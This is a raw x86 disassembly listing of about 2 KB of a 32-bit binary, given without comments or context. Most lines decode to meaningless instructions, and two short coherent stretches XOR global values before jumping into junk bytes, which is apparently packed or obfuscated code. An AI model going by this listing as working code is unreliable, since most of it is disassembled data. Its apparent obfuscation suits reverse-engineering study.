  4084c2:	pop    ds
  4084c3:	or     eax,0x6efd15de
  4084c8:	inc    edx
  4084c9:	test   BYTE PTR [ebx-0x602db2b6],dh
  4084cf:	rol    esp,0xd7
  4084d2:	adc    al,0xbe
  4084d4:	add    BYTE PTR [esp+edi*1],dh
  4084d7:	push   esp
  4084d8:	test   DWORD PTR [edi-0x731c6fc6],ebp
  4084de:	push   esp
  4084df:	xor    eax,0xc6c3245d
  4084e4:	xchg   ebx,eax
  4084e5:	jns    0x408494
  4084e7:	mov    bl,0x75
  4084e9:	icebp  
  4084ea:	cs test eax,0xa61db01b
  4084f0:	xor    bl,bh
  4084f2:	push   ss
  4084f3:	imul   DWORD PTR [edx-0x2f]
  4084f6:	(bad)  
  4084f7:	push   ebx
  4084f8:	cwde   
  4084f9:	daa    
  4084fa:	mov    al,0x45
  4084fc:	test   ebp,0x3d2e198b
  408502:	mov    eax,ds:0xd121b181
  408507:	jg     0x408500
  408509:	pop    esp
  40850a:	mov    edi,0xc1b77b67
  40850f:	cmp    ebx,DWORD PTR [esi+0x86c5138]
  408515:	fs cmp al,0xa9
  408518:	pop    esi
  408519:	jne    0x4084d4
  40851b:	jmp    0x4084a4
  40851d:	or     DWORD PTR [ecx],esi
  40851f:	out    0x2a,al
  408521:	xlat   BYTE PTR ds:[ebx]
  408522:	inc    edx
  408523:	addr16 mov esi,0x5da17a16
  408529:	mov    bl,0x5
  40852b:	lds    eax,FWORD PTR [esi+0x7b9f6fb6]
  408531:	bound  ebp,QWORD PTR [ecx-0x72]
  408534:	scas   al,BYTE PTR es:[edi]
  408535:	popa   
  408536:	jmp    0x408598
  408538:	push   ecx
  408539:	imul   edx,DWORD PTR [edi],0xffffff99
  40853c:	rcr    BYTE PTR ds:0x57677a0e,cl
  408542:	bound  ebx,QWORD PTR [edi]
  408544:	pop    es
  408545:	xchg   BYTE PTR [esp+eax*8-0x6],cl
  408549:	test   al,0x2b
  40854b:	add    al,0xa5
  40854d:	int3   
  40854e:	mov    cl,0x84
  408550:	(bad)  
  408551:	neg    DWORD PTR [ebp+0x2435b151]
  408557:	inc    esi
  408558:	pop    esp
  408559:	cs adc al,0xf5
  40855c:	inc    esi
  40855d:	inc    BYTE PTR [ecx-0x65ee667f]
  408563:	sbb    al,0x3a
  408565:	xchg   edi,eax
  408566:	lods   eax,DWORD PTR ds:[esi]
  408567:	xchg   ecx,eax
  408568:	aas    
  408569:	(bad)  
  40856a:	sbb    bh,BYTE PTR [ecx+0x28d8d1dd]
  408570:	pop    edi
  408571:	sti    
  408572:	cmp    dl,BYTE PTR [edi]
  408574:	dec    ebp
  408575:	adc    al,0x82
  408577:	mov    ecx,0x4505c35b
  40857c:	pop    edx
  40857d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40857e:	jno    0x408572
  408580:	pop    edi
  408581:	shr    DWORD PTR [edx-0x63],cl
  408584:	pop    ss
  408585:	jp     0x408518
  408587:	mov    esi,0x8ece536e
  40858c:	mov    ?,WORD PTR [ebx-0x9a81e8d]
  408592:	popf   
  408593:	fcompp 
  408595:	pop    ebp
  408596:	jg     0x408529
  408598:	not    BYTE PTR [esi-0x77]
  40859b:	jns    0x4085fc
  40859d:	neg    DWORD PTR [esi-0x7657951a]
  4085a3:	sbb    eax,0x619e99bf
  4085a8:	stos   DWORD PTR es:[edi],eax
  4085a9:	gs jge 0x408544
  4085ac:	mov    al,0x90
  4085ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085af:	(bad)  
  4085b0:	xchg   ebp,eax
  4085b1:	in     eax,0xe
  4085b3:	sub    bl,bl
  4085b5:	push   0x8ac17d98
  4085ba:	mov    WORD PTR [eax],?
  4085bc:	xor    BYTE PTR [edx+0x32],bl
  4085bf:	jo     0x4085fd
  4085c1:	out    dx,eax
  4085c2:	inc    edx
  4085c3:	lea    ebp,[ebx-0x29]
  4085c6:	cmp    DWORD PTR [ebx+0x4a],edx
  4085c9:	(bad)  
  4085ca:	fidivr DWORD PTR [edi-0x6d]
  4085cd:	(bad)
  4085d1:	stos   DWORD PTR es:[edi],eax
  4085d2:	lds    esp,FWORD PTR [ecx]
  4085d4:	mov    ebp,0xf83943b3
  4085d9:	and    edi,0x76beb84
  4085df:	xchg   esi,eax
  4085e0:	mov    esi,ecx
  4085e2:	popa   
  4085e3:	addr16 call 0x75d3:0x944bdcb
  4085eb:	ins    DWORD PTR es:[edi],dx
  4085ec:	test   DWORD PTR [eax-0x75],edi
  4085ef:	ja     0x40860c
  4085f1:	mov    edx,0xd52da4b6
  4085f6:	out    0x34,al
  4085f8:	shr    BYTE PTR [eax+0x3507aac8],cl
  4085fe:	mov    ebx,0x2c1cdfb2
  408603:	out    0x88,eax
  408605:	sub    al,0xb9
  408607:	pop    esi
  408608:	shl    dh,0x4e
  40860b:	pop    eax
  40860c:	sti    
  40860d:	adc    BYTE PTR [ebx+0x4],ah
  408610:	xor    bh,BYTE PTR [edi]
  408612:	rol    ebx,0xd3
  408615:	cmp    eax,0x6bcb0446
  40861a:	pop    ss
  40861b:	mov    ecx,0x2b89b533
  408620:	jg     0x4085db
  408622:	jno    0x408685
  408624:	fbstp  TBYTE PTR [edx]
  408626:	aas    
  408627:	cmp    al,0xe6
  408629:	mov    DWORD PTR [ebx-0x19],esi
  40862c:	(bad)  
  40862f:	and    eax,0x2df1587
  408634:	or     DWORD PTR [eax],esp
  408636:	mov    dh,0xa2
  408638:	pop    ebp
  408639:	js     0x40869a
  40863b:	ss data16 in al,0x53
  40863f:	mov    ds:0x3936bbc3,al
  408644:	mov    ecx,0xc08b78d2
  408649:	call   0x21d3ca5c
  40864e:	mov    al,ds:0x57c32c3d
  408653:	xchg   ebp,eax
  408654:	inc    ebp
  408655:	cmp    bl,BYTE PTR [edx+0x65]
  408658:	loop   0x4085f9
  40865a:	sub    DWORD PTR [ebp-0x5b248e70],ebp
  408660:	in     eax,0x28
  408662:	sbb    esp,DWORD PTR [edi+0x18cfc245]
  408668:	xor    BYTE PTR [eax],dl
  40866a:	xor    al,0x3e
  40866c:	les    edx,FWORD PTR [edi+0x2e]
  40866f:	pop    esp
  408670:	fld    QWORD PTR [edx+0x63]
  408673:	leave  
  408674:	test   DWORD PTR [esi],ebp
  408676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408677:	rcr    BYTE PTR [ecx+0x345a5dfe],0xb
  40867e:	xor    BYTE PTR ds:0x64693352,bh
  408684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408685:	lea    ebx,[ebx+edx*4+0x63f00ae9]
  40868c:	lods   eax,DWORD PTR ds:[esi]
  40868d:	rcr    BYTE PTR ss:[ecx+0x32],1
  408691:	sar    BYTE PTR [ecx],cl
  408693:	mov    ebp,0x1d29d61c
  408698:	inc    ebp
  408699:	mov    eax,ds:0x12feb8bb
  40869e:	mov    es,WORD PTR [ecx+0x4337e315]
  4086a4:	add    BYTE PTR [ebx+0x37],bh
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	cmp    BYTE PTR [ebx+0x0],al
  4086b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x5319734a],ecx
  4086ca:	iret   
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	xchg   edx,eax
  4086d4:	daa    
  4086d5:	mov    dh,0xed
  4086d7:	mov    edx,0xe9c212ce
  4086dc:	xchg   ebp,eax
  4086dd:	(bad)  
  4086de:	mov    eax,0x88e4d992
  4086e3:	mov    ch,0x64
  4086e5:	cli    
  4086e6:	test   DWORD PTR [ebx+0xcb427c8],0x10adf870
  4086f0:	jae    0x40874a
  4086f2:	fist   DWORD PTR [edi+ecx*2+0x7d86cf54]
  4086f9:	(bad)  
  4086fa:	mov    esp,0xb3e942a3
  4086ff:	mov    dl,0xeb
  408701:	jg     0x408744
  408703:	ficomp DWORD PTR [ebx+0x3cc3b895]
  408709:	scas   al,BYTE PTR es:[edi]
  40870a:	mov    al,ds:0x58542cbb
  40870f:	inc    edx
  408710:	and    dl,BYTE PTR [eax]
  408712:	inc    edx
  408713:	adc    DWORD PTR [ebx],ecx
  408715:	outs   dx,DWORD PTR ds:[esi]
  408716:	ret    0xbe4f
  408719:	mov    bh,0x3
  40871b:	call   0xf43df0e4
  408720:	xchg   BYTE PTR [edi+0x6e3a43d4],dh
  408726:	xchg   ecx,eax
  408727:	add    cl,ah
  408729:	inc    edx
  40872a:	pop    es
  40872b:	lods   eax,DWORD PTR ds:[esi]
  40872c:	popf   
  40872d:	or     al,cl
  40872f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408730:	and    BYTE PTR [ebx],ch
  408732:	lods   al,BYTE PTR ds:[esi]
  408733:	scas   eax,DWORD PTR es:[edi]
  408734:	add    ecx,DWORD PTR [eax-0xf20ce77]
  40873a:	sub    DWORD PTR ds:0x1a450cda,edx
  408740:	mov    al,0xb2
  408742:	mov    ds:0xb28ef96e,eax
  408747:	daa    
  408748:	aaa    
  408749:	sub    dl,BYTE PTR [esp+esi*4-0xb]
  40874d:	out    dx,al
  40874e:	mov    al,0x36
  408750:	call   0xfa0145da
  408755:	rcr    BYTE PTR [eax-0x41],1
  408758:	jne    0x4087c6
  40875a:	std    
  40875b:	xchg   ecx,eax
  40875c:	lock retf 
  40875e:	arpl   dx,sp
  408760:	shl    DWORD PTR [ecx],1
  408762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408763:	and    al,0xb0
  408765:	in     eax,0x6c
  408767:	shl    dl,cl
  408769:	add    al,0x4f
  40876b:	fmul   QWORD PTR [ecx-0x16]
  40876e:	in     al,dx
  40876f:	aad    0xc8
  408771:	(bad)  
  408772:	jmp    0x4086f9
  408774:	std    
  408775:	fimul  DWORD PTR [ecx+0xd]
  408778:	pushf  
  408779:	mov    al,0x6e
  40877b:	(bad)  
  40877e:	addr16 js 0x408716
  408781:	mov    fs,WORD PTR [edi]
  408783:	mov    DWORD PTR [ebp-0x73],esi
  408786:	sbb    dl,BYTE PTR [ecx]
  408788:	fcomp  st(6)
  40878a:	mov    WORD PTR [eax],gs
  40878c:	scas   al,BYTE PTR es:[edi]
  40878d:	pop    es
  40878e:	call   0xbcd5f326
  408793:	jbe    0x408778
  408795:	stos   BYTE PTR es:[edi],al
  408796:	xchg   esi,eax
  408797:	sbb    dl,ch
  408799:	mov    eax,ds:0x24180c47
  40879e:	rcl    BYTE PTR [edi-0x571a334e],1
  4087a4:	inc    edi
  4087a5:	sub    BYTE PTR [edi-0x1e],ch
  4087a8:	or     dh,BYTE PTR [eax-0x7e91c9fc]
  4087ae:	dec    esi
  4087af:	cmp    DWORD PTR [edi-0x38],esp
  4087b2:	xchg   edx,eax
  4087b3:	push   es
  4087b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b5:	lock push 0xffffffe3
  4087b8:	in     eax,dx
  4087b9:	shl    BYTE PTR [ecx-0xa4c3824],cl
  4087bf:	call   0x5049:0xbab995d6
  4087c6:	adc    ebp,ecx
  4087c8:	std    
  4087c9:	jle    0x408756
  4087cb:	xor    edi,edi
  4087cd:	jmp    0x538279f3
  4087d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087d3:	pop    ds
  4087d4:	call   0xefd1919d
  4087d9:	stc    
  4087da:	(bad)  
  4087dc:	(bad)
  4087df:	js     0x4087a5
  4087e1:	in     eax,dx
  4087e2:	sub    DWORD PTR [esp+ebp*4-0x28],0xb98396fe
  4087ea:	and    ax,0x7130
  4087ee:	ins    BYTE PTR es:[edi],dx
  4087ef:	add    ch,BYTE PTR [edx+0x52c118d6]
  4087f5:	jno    0x408795
  4087f7:	pop    ebx
  4087f8:	fstp   TBYTE PTR [ebx]
  4087fa:	into   
  4087fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087fc:	dec    esi
  4087fd:	sets   BYTE PTR [ebp+0x1e]
  408801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408802:	popa   
  408803:	cdq    
  408804:	fnstenv [esi-0x27]
  408807:	adc    esi,edi
  408809:	rcr    DWORD PTR [ecx],cl
  40880b:	adc    al,0x56
  40880d:	pop    ds
  40880e:	mov    WORD PTR [eax+eax*4],ds
  408811:	retf   0x9984
  408814:	sub    ebx,DWORD PTR ds:0x5631d338
  40881a:	push   ss
  40881b:	into   
  40881c:	(bad)  
  40881d:	retf   0x2fd8
  408820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408821:	add    esi,0x1ec0d90d
  408827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408828:	call   0x3af66362
  40882d:	daa    
  40882e:	fild   WORD PTR [edx-0x5e]
  408831:	shr    DWORD PTR ds:0x26e7dc6b,cl
  408837:	cmp    esi,DWORD PTR [ebp-0x1461796c]
  40883d:	nop
  40883e:	data16 gs clc 
  408841:	lahf   
  408842:	stos   BYTE PTR es:[edi],al
  408843:	and    DWORD PTR [ebx-0x56f013e3],0xb699b9dc
  40884d:	adc    bl,dh
  40884f:	xor    al,0x53
  408851:	sbb    cl,ch
  408853:	xor    dl,BYTE PTR [esi]
  408855:	jmp    0x2b24:0xebf4895b
  40885c:	inc    ebp
  40885d:	cmp    esi,esi
  40885f:	out    0x72,eax
  408861:	hlt    
  408862:	repz inc ebp
  408864:	je     0x4088d1
  408866:	imul   edi,DWORD PTR [edi-0x13],0xffffff8d
  40886a:	std    
  40886b:	inc    ebx
  40886c:	add    esp,esi
  40886e:	push   0xd2c678ea
  408873:	mov    ds:0xa885246a,eax
  408878:	(bad)
  40887b:	lock sbb dl,ah
  40887e:	inc    eax
  40887f:	jne    0x4088f9
  408881:	adc    eax,0x25afc7ca
  408886:	jno    0x4088c1
  408888:	pop    edi
  408889:	sub    dh,ah
  40888b:	test   eax,0xf164fc2
  408890:	test   BYTE PTR [edi+0x76],dl
  408893:	(bad)  
  408894:	jmp    0x4088c8
  408896:	sbb    BYTE PTR [edx+0x4ae20825],al
  40889c:	add    ch,BYTE PTR [edi+0x4a]
  40889f:	cmc    
  4088a0:	fcmovnb st,st(0)
  4088a2:	rol    DWORD PTR [ebp-0x46],0x88
  4088a6:	push   0x7f8d5fa9
  4088ab:	sbb    BYTE PTR [edx+edi*8],bh
  4088ae:	mov    cl,0x9b
  4088b0:	xchg   edi,ecx
  4088b2:	mov    eax,DWORD PTR [esi+0x6c]
  4088b5:	out    dx,eax
  4088b6:	or     dl,BYTE PTR [eax+ebp*4]
  4088b9:	adc    DWORD PTR [edi+0x614953d9],ecx
  4088bf:	sub    bh,BYTE PTR [edx-0x33ad2a28]
  4088c5:	std    
  4088c6:	mov    WORD PTR [edx],ss
  4088c8:	push   ds
  4088c9:	in     al,dx
  4088ca:	ja     0x40888e
  4088cc:	faddp  st(1),st
  4088ce:	ins    DWORD PTR es:[edi],dx
  4088cf:	inc    esi
  4088d0:	mov    eax,0x984295dd
  4088d5:	push   eax
  4088d6:	jecxz  0x40887f
  4088d8:	xchg   edi,eax
  4088d9:	ja     0x408878
  4088db:	mov    esi,DWORD PTR [ecx]
  4088dd:	mov    ch,0x8f
  4088df:	cmp    ebp,DWORD PTR [eax]
  4088e1:	aad    0x8f
  4088e3:	not    DWORD PTR [edx]
  4088e5:	mov    bl,0xa2
  4088e7:	clc    
  4088e8:	inc    esi
  4088e9:	or     ebp,DWORD PTR [ebx+eiz*2-0x74]
  4088ed:	xor    eax,0x8fbcc41b
  4088f2:	je     0x408939
  4088f4:	lea    ebx,[edx]
  4088f6:	dec    ebx
  4088f7:	sub    BYTE PTR [eax-0xc],ch
  4088fa:	pop    eax
  4088fb:	mov    bl,0xe3
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4337e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf7add62c
  408968:	jecxz  0x40891a
  40896a:	aam    0x7e
  40896c:	jle    0x408992
  40896e:	jl     0x4089ee
  408970:	jle    0x4089cc
  408972:	aas    
  408973:	sub    DWORD PTR [ebx],ebx
  408975:	sahf   
  408976:	sbb    BYTE PTR [ebp+0x54ea13b2],bh
  40897c:	xor    eax,0x8cd80104
  408981:	pushf  
  408982:	(bad)  
  408983:	test   al,0x8c
  408985:	jmp    0x40893a
  408987:	xchg   ecx,eax
  408988:	jmp    0x56a871fd
  40898d:	xchg   esp,eax
  40898e:	repz cmp cl,cl
  408991:	inc    BYTE PTR [edi]
  408993:	adc    eax,0x102fdcdb
  408998:	pop    es
  408999:	and    BYTE PTR [ebx-0xe1dcb62],bl
  40899f:	int    0x6f
  4089a1:	adc    ah,bl
  4089a3:	call   0xe5b3f8e3
  4089a8:	imul   eax,DWORD PTR ds:[esi+0x23],0x54d37ce2
  4089b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b1:	popf   
  4089b2:	(bad)  
  4089b3:	jae    0x408962
  4089b5:	and    al,0x9a
  4089b7:	out    dx,eax
  4089b8:	xchg   ecx,eax
  4089b9:	mov    BYTE PTR [ecx+0x3a9cc206],cl
  4089bf:	jns    0x4089ca
  4089c1:	inc    esi
  4089c2:	setg   BYTE PTR [edi-0x4f318bec]
  4089c9:	shr    ebp,1
  4089cb:	test   eax,0x1eef3475
  4089d0:	push   ecx
  4089d1:	imul   ebp,DWORD PTR [ecx+edi*8-0x157faad7],0x55
  4089d9:	sub    al,0x89
  4089db:	jbe    0x4089db
  4089dd:	xor    edx,ebp
  4089df:	jbe    0x408a4f
  4089e1:	arpl   WORD PTR [ebp+edi*4+0x513513fe],bp
  4089e8:	je     0x408a16
  4089ea:	push   0x7e
  4089ec:	add    edx,esp
  4089ee:	shr    DWORD PTR [ecx],cl
  4089f0:	cmp    ebx,esi
  4089f2:	lea    esi,[ebp+0x39]
  4089f5:	push   ebp
  4089f6:	sub    bl,dh
  4089f8:	sub    al,0xc6
  4089fa:	dec    ecx
  4089fb:	gs ss mov cl,0x76
  4089ff:	sbb    ah,BYTE PTR [ebx-0x61c28069]
  408a05:	sbb    DWORD PTR [ebp-0x58],ecx
  408a08:	and    eax,0xbcab7286
  408a0d:	loopne 0x408a81
  408a0f:	sub    BYTE PTR [edi-0x3a4555f0],0xc4
  408a16:	jg     0x4089fe
  408a18:	push   es
  408a19:	dec    ebp
  408a1a:	call   0xc408:0x5c247774
  408a21:	sub    eax,0xa734a2bd
  408a26:	mov    ebp,0x7aa5f277
  408a2b:	mov    eax,0x5e8120f3
  408a30:	cmp    eax,ecx
  408a32:	je     0x4089e5
  408a34:	jo     0x408a20
  408a36:	ds jmp 0x408a14
  408a39:	cdq    
  408a3a:	loop   0x408a3f
  408a3c:	jno    0x408a6d
  408a3e:	lods   eax,DWORD PTR ds:[esi]
  408a3f:	pop    esi
  408a40:	ds mov esi,0xd6a256d5
  408a46:	call   0x4990af28
  408a4b:	xor    ecx,ecx
  408a4d:	mov    ebx,fs
  408a4f:	dec    eax
  408a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a51:	and    BYTE PTR [esp+ecx*8+0xd],dl
  408a55:	inc    ecx
  408a56:	lods   al,BYTE PTR ds:[esi]
  408a57:	jo     0x408acf
  408a59:	sub    BYTE PTR [edx],0x70
  408a5c:	cmp    BYTE PTR [ecx+0x4c],bl
  408a5f:	into   
  408a60:	icebp  
  408a61:	or     bl,dh
  408a63:	fist   DWORD PTR [ebx-0x31c2ca53]
  408a69:	jmp    0x408ac5
  408a6b:	and    dl,BYTE PTR [ebp+0x43]
  408a6e:	cdq    
  408a6f:	loope  0x408abc
  408a71:	addr16 inc esp
  408a73:	aad    0x8e
  408a75:	mov    cl,0x94
  408a77:	and    DWORD PTR [ecx],0xffffffb4
  408a7a:	dec    esi
  408a7b:	pop    ss
  408a7c:	sub    BYTE PTR [esi+0x1456583a],0x42
  408a83:	add    BYTE PTR [edi-0x59],cl
  408a86:	cmp    ebx,DWORD PTR [ecx]
  408a88:	das    
  408a89:	sbb    eax,0xbbb1a25c
  408a8e:	aam    0x2f
  408a90:	call   0x8db2a92a
  408a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a96:	push   edi
  408a97:	mov    al,0xfa
  408a99:	inc    esi
  408a9a:	(bad)  
  408a9b:	arpl   WORD PTR [ebp-0x29de75af],di
  408aa1:	addr16 ss pop ebp
  408aa4:	and    ecx,DWORD PTR [esi]
  408aa6:	jecxz  0x408aac
  408aa8:	fld    TBYTE PTR [edx-0x56]
  408aab:	push   ebp
  408aac:	fcmovnu st,st(5)
  408aae:	jmp    0x408ab5
  408ab0:	bound  eax,QWORD PTR [edx+0x16569d4b]
  408ab6:	call   0x475018a9
  408abb:	jmp    0x48bad925
  408ac0:	sub    BYTE PTR [ebx-0x4d2e44a4],ah
  408ac6:	in     eax,dx
  408ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac8:	xor    ah,BYTE PTR [edi]
  408aca:	push   es
  408acb:	xchg   edi,eax
  408acc:	loope  0x408a94
  408ace:	cwde   
  408acf:	pushf  
  408ad0:	jecxz  0x408acc
  408ad2:	pop    ds
  408ad3:	out    dx,al
  408ad4:	je     0x408a8a
  408ad6:	mov    WORD PTR [ebx+eiz*8+0x1fe8e3a7],ss
  408add:	xchg   BYTE PTR [edx+0x7c],bh
  408ae0:	mov    bl,0x51
  408ae2:	mov    WORD PTR [ebx+0x4b0d9942],ds
  408ae8:	loope  0x408aa4
  408aea:	xor    eax,0xcffb0ede
  408aef:	xor    al,0xee
  408af1:	push   edx
  408af2:	inc    ecx
  408af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af4:	or     dl,BYTE PTR [edx-0x6a]
  408af7:	addr16 mov eax,0x77c8e2ca
  408afd:	retf   
  408afe:	and    dh,BYTE PTR [esi*2+0x64fd365b]
  408b05:	ror    DWORD PTR [edi-0x5b],1
  408b08:	in     eax,0x7f
  408b0a:	mov    edi,0xcd5fce28
  408b0f:	call   0x3de7:0x1b7515e7
  408b16:	icebp  
  408b17:	cmp    DWORD PTR [eax+0x53464b1d],edx
  408b1d:	mov    esp,0xf4657e74
  408b22:	fld    DWORD PTR [ebx]
  408b24:	xchg   ecx,eax
  408b25:	inc    ecx
  408b26:	(bad)  
  408b27:	push   ecx
  408b28:	data16 cld 
  408b2a:	loopne 0x408b31
  408b2c:	xchg   esi,eax
  408b2d:	in     eax,dx
  408b2e:	(bad)  
  408b2f:	or     DWORD PTR [esi-0x4a],ebx
  408b32:	jno    0x408b5f
  408b34:	es int 0x66
  408b37:	sbb    DWORD PTR [eax+0x22],0x9484de33
  408b3e:	cmp    bl,dl
  408b40:	or     al,0x5b
  408b42:	sub    al,0x28
  408b44:	call   0xd9981acc
  408b49:	ret    
  408b4a:	retf   0xb3c0
  408b4d:	pop    ss
  408b4e:	adc    DWORD PTR [ebp-0x1824cbff],ebx
  408b54:	bound  edi,QWORD PTR [eax-0x2c824d45]
  408b5a:	sub    al,0x7c
  408b5c:	xchg   BYTE PTR [edi+0x317ed62],dh
  408b62:	das    
  408b63:	hlt    
  408b64:	jno    0x408b98
  408b66:	inc    edx
  408b67:	cmp    BYTE PTR [esi],ch
  408b69:	out    0x16,eax
  408b6b:	push   edi
  408b6c:	fsub   st(4),st
  408b6e:	add    eax,0x83e8c0a2
  408b73:	(bad)  
  408b74:	push   ss
  408b75:	fiadd  DWORD PTR [ecx]
  408b77:	xor    DWORD PTR [ebx-0x15],0xae52c642
  408b7e:	fstp   DWORD PTR [ebp+0x4509f529]
  408b84:	add    esp,ebx
  408b86:	cmp    DWORD PTR ds:0x7dcbae48,ebp
  408b8c:	fidivr DWORD PTR [esi+0x2b84660b]
  408b92:	xchg   ecx,eax
  408b93:	not    BYTE PTR [edx-0x35]
  408b96:	daa    
  408b97:	imul   ebp,DWORD PTR [esi],0xe
  408b9a:	test   al,0xf
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	aam    0x9d
  408bf2:	test   DWORD PTR [edx+0x66],0x247e7ed2
  408bf9:	jl     0x408c79
  408bfb:	jle    0x408c70
  408bfd:	and    esi,DWORD PTR [ebx-0x3ba1b20e]
  408c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c04:	pop    esp
  408c05:	(bad)  
  408c06:	nop
  408c07:	push   edx
  408c08:	in     al,dx
  408c09:	call   0x7377:0x60d332d7
  408c10:	adc    al,0xb3
  408c12:	add    BYTE PTR [esi],bh
  408c14:	push   ecx
  408c15:	xor    BYTE PTR [ecx],cl
  408c17:	inc    ecx
  408c18:	jb     0x408c2d
  408c1a:	int3   
  408c1b:	xor    BYTE PTR [edi],cl
  408c1d:	lahf   
  408c1e:	jp     0x408bac
  408c20:	xchg   edx,eax
  408c21:	pop    esp
  408c22:	js     0x408c89
  408c24:	pop    es
  408c25:	(bad)  
  408c26:	mov    ch,0x8b
  408c28:	cmp    DWORD PTR [eax-0x20],edi
  408c2b:	add    ecx,eax
  408c2d:	sbb    eax,0x9f99630
  408c32:	mov    edx,0x7c2a403d
  408c37:	inc    ebx
  408c38:	xor    BYTE PTR [ebp+0x67c3b957],bh
  408c3e:	pop    ebx
  408c3f:	mov    bh,0x2a
  408c41:	add    eax,0xe89c0991
  408c46:	sub    cl,BYTE PTR [ecx-0x6bad6cb2]
  408c4c:	jp     0x408c0c
  408c4e:	(bad)  
  408c4f:	pusha  
  408c50:	jle    0x408c91
  408c52:	sbb    dl,BYTE PTR [ebp+0x54]
  408c55:	or     ax,0xa3bb
  408c59:	mov    ch,0x3
  408c5b:	pusha  
  408c5c:	je     0x408c92
  408c5e:	mov    ebx,0xc777b03
  408c63:	lahf   
  408c64:	out    0x42,al
  408c66:	add    al,0x27
  408c68:	mov    bl,0xa1
  408c6a:	mov    gs,WORD PTR [ebx+0x30]
  408c6d:	fld    TBYTE PTR [edi-0x2b809c5d]
  408c73:	mov    al,ds:0xf78f411f
  408c78:	rol    BYTE PTR [edi+0x74],0xd1
  408c7c:	xchg   ecx,eax
  408c7d:	aam    0xbb
  408c7f:	add    esi,ecx
  408c81:	cwde   
  408c82:	jecxz  0x408c3e
  408c84:	aaa    
  408c85:	ins    DWORD PTR es:[edi],dx
  408c86:	cmp    BYTE PTR [ecx+0x526a25fb],0xb5
  408c8d:	jecxz  0x408c83
  408c8f:	pop    eax
  408c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c91:	pop    ebp
  408c92:	popf   
  408c93:	fmul   st(0),st
  408c95:	ret    0xe72d
  408c98:	hlt    
  408c99:	retf   
  408c9a:	add    al,0x9
  408c9c:	xchg   DWORD PTR [eax+ebp*2+0x4e],esp
  408ca0:	pop    ebp
  408ca1:	sbb    al,0xdc
  408ca3:	push   0x65a925de
  408ca8:	jg     0x408cae
  408caa:	std    
  408cab:	fxch   st(1)
  408cad:	js     0x408c72
  408caf:	pop    edi
  408cb0:	pop    ebx
  408cb1:	std    
  408cb2:	and    BYTE PTR [edi-0x3a],cl
  408cb5:	popf   
